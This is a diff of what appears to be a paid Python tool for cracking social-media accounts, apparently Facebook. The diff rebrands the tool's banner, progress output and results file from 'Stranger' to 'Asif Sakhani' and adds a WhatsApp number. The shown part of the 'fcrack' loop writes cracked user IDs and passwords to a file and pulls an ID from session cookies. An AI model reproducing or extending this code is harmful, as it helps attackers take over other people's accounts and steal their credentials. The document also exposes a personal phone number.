@@ -1093,13 +1093,13 @@ logo = """
  /_/    \_\_____/|_____|_|     
 
 --------------------------------------------------
-(+) AUTHOR     : \033[1;32mAsif_Sakhani \033[1;37m
-(+) GITHUB     : \033[1;32mAsif Sakhani\033[1;37m
-(+) TOOL NAME  : \033[1;32mAsif Sakhani\033[1;37m
+(+) AUTHOR     : \033[1;32mAsif Sakhani \033[1;37m
+(+) GITHUB     : \033[1;32mAsifsakhani3366\033[1;37m
+(+) Whatsapp  : \033[1;32m03417020930\033[1;37m
 (+) TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
 (+) STATUS     : \033[1;32mPaid\033[1;37m
 --------------------------------------------------
-(+) \033[1;37mVERSION    :\033[1;32m1.1\033[1;37mAsif Sakhani 03417020930\033[1;37m
+(+) \033[1;37mVERSION    :\033[1;32m1.1\033[1;37m  "ASIF SAKHANI"\033[1;37m
 --------------------------------------------------"""
 def lines():
 	print('\33[1;37m--------------------------------------------------')
@@ -1502,13 +1502,13 @@ def fcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
                 # print('\033[1;33m[Stranger-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('Stranger-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                open('Asif-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mStranger\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mAsif\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
